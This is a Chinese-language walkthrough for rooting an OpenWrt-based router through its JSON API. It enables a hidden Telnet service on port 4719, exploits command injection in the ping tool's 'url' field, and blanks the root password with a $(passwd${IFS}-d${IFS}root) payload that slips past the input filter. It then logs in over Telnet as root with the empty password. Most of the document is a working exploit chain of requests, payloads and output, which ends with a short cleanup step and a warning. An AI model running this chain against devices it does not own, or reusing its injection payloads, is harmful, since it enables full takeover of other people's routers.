# 03. 开启 Telnet 与 ping 命令注入

## 1. 隐藏的 SYS_SERVICE_SET 接口

命令 ID：`234`

读取当前状态：

```json
{
  "cmd": 234,
  "method": "GET",
  "sessionId": "<sessionId>"
}
```

响应示例：

```json
{"success": true, "cmd": 234, "telnet": "", "telnet_orca": "0"}
```

开启 Telnet：

```json
{
  "cmd": 234,
  "method": "POST",
  "telnet": "1",
  "ssh": "1",
  "sessionId": "<sessionId>"
}
```

响应：

```json
{"success": true, "cmd": 234, "message": ""}
```

再次读取：

```json
{"success": true, "cmd": 234, "telnet": "1", "telnet_orca": "0"}
```

结果：

- Telnet 服务监听在 **4719** 端口（不是 23）
- `ssh:"1"` 在该固件上被忽略，SSH 并没有因此开启
- 该固件的 Dropbear 配置默认是 `Port 8357`、`enable 0`

## 2. ping 命令注入

前端 ping 页面实际调用的是 `NETWORK_TOOLS`：

```json
{
  "cmd": 168,
  "method": "POST",
  "subcmd": 0,
  "pingTimes": 1,
  "url": "127.0.0.1",
  "sessionId": "<sessionId>"
}
```

`url` 参数会被拼进后端 shell 命令，存在命令注入。测试 payload：

```text
$(id)
```

发送后，ping 的地址会变成 `id` 的输出，读取 ping 结果即可验证：

```json
{
  "cmd": 204,
  "method": "GET",
  "url": "/tmp/tzwww/pingrt",
  "subcmd": 168,
  "sessionId": "<sessionId>"
}
```

返回（纯文本）：

```text
ping: bad address 'uid=0(root) gid=0(root) groups=0(root)'
```

说明命令以 root 执行。

## 3. 清空 root 密码

payload：

```text
$(passwd${IFS}-d${IFS}root)
```

说明：

- 后端过滤了双引号和反引号，但没有过滤 `$()`。
- 输入框/前端可能限制空格，使用 `${IFS}` 代替空格。
- 该 payload 执行后，root 密码被清空。

发送后读取 ping 结果，可见：

```text
passwd: password for root changed by root
```

## 4. 通过 Telnet 获取 root shell

```bash
telnet 192.168.1.1 4719
```

登录：

```text
OpenWrt login: root
Password: （直接回车，空密码）
```

成功后会进入 BusyBox ash：

```text
root@OpenWrt:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 5. 安全清理

SSH 配置完成并验证后，关闭 Telnet：

```json
{
  "cmd": 234,
  "method": "POST",
  "telnet": "0",
  "ssh": "1",
  "sessionId": "<sessionId>"
}
```

确认 4719 已关闭：

```text
4719 closed
```

> 不要把 4719 长期暴露在网络上；root 空密码 + Telnet 是非常危险的组合。
